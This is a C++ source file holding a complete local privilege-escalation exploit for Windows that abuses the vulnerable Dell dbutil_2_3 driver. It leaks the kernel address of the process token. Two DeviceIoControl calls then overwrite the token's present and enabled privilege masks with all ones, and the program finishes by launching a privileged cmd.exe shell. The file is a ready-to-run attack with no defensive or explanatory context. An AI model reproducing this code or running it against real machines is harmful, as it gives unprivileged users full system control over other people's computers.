// Dell_EoP.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <stdio.h>
#define NT_SUCCESS(x) ((x) >= 0)
#include <process.h>
#include "Header.h"

HANDLE tokenHandle = NULL;
HANDLE processHandle = NULL;
NTSTATUS status;

//////https://github.com/clymb3r/KdExploitMe/blob/master/ExploitDemos/KernelAddressLeak.cpp
BOOL QueryNtHandles(PSYSTEM_HANDLE_INFORMATION_EX* handleInfo)
{
	BOOL functionSuccess = FALSE;
	ULONG handleInfoSize = sizeof(SYSTEM_HANDLE_INFORMATION_EX) + (sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX) * 10000);
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH; //Make status be an error so the loop starts.
	*handleInfo = NULL;

	HMODULE hModule = LoadLibraryW(L"ntdll.dll");
	tNtQuerySystemInformation pNtQuerySystemInformation = (tNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
	FreeLibrary(hModule);
	if (pNtQuerySystemInformation == NULL)
	{
		printf("[-] Error: Cannot retrieve NtQuerySystemInformation address.\n");
		goto Cleanup;
	}

	ULONG requiredSize = 0;
	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (*handleInfo)
		{
			free(*handleInfo);
		}

		//Allocate space for NtQuerySystemInformation and call it
		*handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(handleInfoSize);
		ZeroMemory(*handleInfo, handleInfoSize);
		status = (*pNtQuerySystemInformation)(SystemExtendedHandleInformation, *handleInfo, handleInfoSize, &requiredSize);
		//If there isn't enough space in the buffer, increase the buffer size
		if (NT_SUCCESS(status))
		{
			break;
		}
		else if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			ULONG additionalSpace = sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX) * 1000;
			if (ULONG_MAX - additionalSpace < requiredSize)
			{
				printf("[-] Error: Looping error increasing buffersize for NtQuerySystemInformation.\n");
				goto Cleanup;
			}

			handleInfoSize = requiredSize + additionalSpace;
		}
		else
		{
			printf("[-] Error: Unexpected error from NtQuerySystemInformation. Error: 0x%x\n", status);
			goto Cleanup;
		}
	}

	//printf("[+] QueryNtHandles returning success: NtQuerySystemInformation returned %i entries.\n", (*handleInfo)->NumberOfHandles);
	functionSuccess = TRUE;

Cleanup:
	if (!functionSuccess)
	{
		if (*handleInfo)
		{
			free(*handleInfo);
			*handleInfo = NULL;
		}
	}

	return functionSuccess;
}

BOOL LeakAddressOfObjectByHandleInProcess(HANDLE hHandle, PVOID* tokenAddress)
{
	BOOL functionSuccess = FALSE;
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
	DWORD currentProcessId = 0;
	BOOL success = FALSE;

	currentProcessId = GetCurrentProcessId();

	if (hHandle == NULL)
	{
		printf("[-] Error: hHandle cannot be NULL\n");
		goto Cleanup;
	}

	//Get all kernel handles
	if (!QueryNtHandles(&handleInfo))
	{
		printf("[-] Error calling QueryNtHandles to retrieve kernel handles info.\n");
		goto Cleanup;
	}

	//Find the current token from the handles retrieved
	//printf("[+] Retrieved all kernel handles. Looking for the address of the supplied token.\n");
	size_t numRetrievedHandles = handleInfo->NumberOfHandles;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handleInfo->Handles;
	for (size_t i = 0; i < numRetrievedHandles; i++)
	{
		if (handleEntry->UniqueProcessId == (HANDLE)currentProcessId && handleEntry->HandleValue == hHandle)
		{
			*tokenAddress = handleEntry->Object;
			//printf("[+] The address of the hHandle object is: 0x%p\n", *tokenAddress);
			functionSuccess = TRUE;
			goto Cleanup;
		}

		handleEntry++;
	}

	printf("[-] Error trying to locate hHandle in the returned kernel handles.\n");

Cleanup:
	if (handleInfo)
	{
		free(handleInfo);
		handleInfo = NULL;
	}

	return functionSuccess;
}

//https://github.com/clymb3r/KdExploitMe/blob/master/ExploitDemos/KernelAddressLeak.cpp
BOOL LeakCurrentUserTokenAddress(PVOID* tokenAddress)
{
	BOOL functionSuccess = FALSE;
	DWORD currentProcessId = 0;
	HANDLE hCurrentProcess = NULL;
	HANDLE hProcessToken = NULL;

	//Obtain a token for the current process
	currentProcessId = GetCurrentProcessId();
	hCurrentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, currentProcessId);
	if (!hCurrentProcess)
	{
		printf("[-] Error opening current process. Error code: 0x%x\n", GetLastError());
		goto Cleanup;
	}

	functionSuccess = OpenProcessToken(hCurrentProcess, TOKEN_QUERY, &hProcessToken);
	if (!functionSuccess)
	{
		printf("[-] Error opening process token. Error code: 0x%x\n", GetLastError());
		goto Cleanup;
	}
	//printf("[+] Obtained a handle to the current process token.\n");

	functionSuccess = LeakAddressOfObjectByHandleInProcess(hProcessToken, tokenAddress);

Cleanup:
	if (hCurrentProcess)
	{
		CloseHandle(hCurrentProcess);
		hCurrentProcess = NULL;
	}
	if (hProcessToken)
	{
		CloseHandle(hProcessToken);
		hProcessToken = NULL;
	}

	return functionSuccess;
}


#define presentOffset = 0x42
#define enabledOffset = 0x4A
int main()
{
	PVOID tokenAddress = NULL;
	PVOID tokenPresentAddress = NULL;
	PVOID tokenEnabledAddress = NULL;

	// Set TokenPrivilegeAddress to the address of the tokens privileges
	if (!LeakCurrentUserTokenAddress((PVOID*)(&tokenAddress)))
	{
		printf("[-] Error: Unable to leak current user token address.\n");

	}
	tokenPresentAddress = (UINT64*)((UINT_PTR)tokenAddress + 0x42);//(PVOID)(tokenAddress + 0x42);//(tokenAddress + presentOffset);
	tokenEnabledAddress = (UINT64*)((UINT_PTR)tokenAddress + 0x4A);
	printf("[+] Address of user token: 0x%p\n", tokenAddress);
	printf("    |------> Address of user token present privileges: 0x%p\n", tokenPresentAddress);
	printf("    |------> Address of user token enabled privileges: 0x%p\n", tokenEnabledAddress);


	// Create driver handle
	HANDLE hevdDriver = CreateFile(L"\\\\.\\dbutil_2_3",               // lpFileName
		GENERIC_READ | GENERIC_WRITE,			 // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,		 // dwShareMode
		NULL,						 // lpSecurityAttributes
		OPEN_EXISTING,					 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,				 // dwFlagsAndAttributes
		NULL						 // hTemplateFile
	);

	if (hevdDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to grab device handle with error code: %u\n", GetLastError());
		return 1;
	}

	printf("[+] '\\\\.\\dbutil_2_3' driver handle is at: %p\n", hevdDriver);

	ULONG_PTR MASK_TO_WRITE = 0xFFFFFFFFFFFFFFFF;

	DWORD bytesReturned = 0;
	struct _ioctl_input_params privilege_present_params = { 0 };
	privilege_present_params.address = tokenPresentAddress;
	privilege_present_params.value_to_write = MASK_TO_WRITE;

	printf("[+] Overwriting token present privileges at: 0x%p\n", privilege_present_params.address);
	BOOL ioResult = DeviceIoControl(hevdDriver, 0x9B0C1EC8, &privilege_present_params,
		sizeof(privilege_present_params), &privilege_present_params, sizeof(privilege_present_params), &bytesReturned, NULL);
	if (!ioResult) {
		printf("[!] Failed to interact with driver with error code: %u\n", GetLastError());
		return 1;
	}
	//printf("[+] DeviceIoControl trigger1 succeeded!\n");

	struct _ioctl_input_params privilege_enabled_params = { 0 };
	privilege_enabled_params.address = tokenEnabledAddress;
	privilege_enabled_params.value_to_write = MASK_TO_WRITE;

	printf("[+] Overwriting token enabled privileges at: 0x%p\n", privilege_enabled_params.address);
	BOOL _ioResult = DeviceIoControl(hevdDriver, 0x9B0C1EC8, &privilege_enabled_params,
		sizeof(privilege_enabled_params), &privilege_enabled_params, sizeof(privilege_enabled_params), &bytesReturned, NULL);
	if (!_ioResult) {
		printf("[!] Failed to interact with driver with error code: %u\n", GetLastError());
		return 1;
	}
	//printf("[+] DeviceIoControl trigger2 succeeded!\n");

	printf("[+] Enjoy your privzZzZz!\n");
	system("cmd.exe");
}
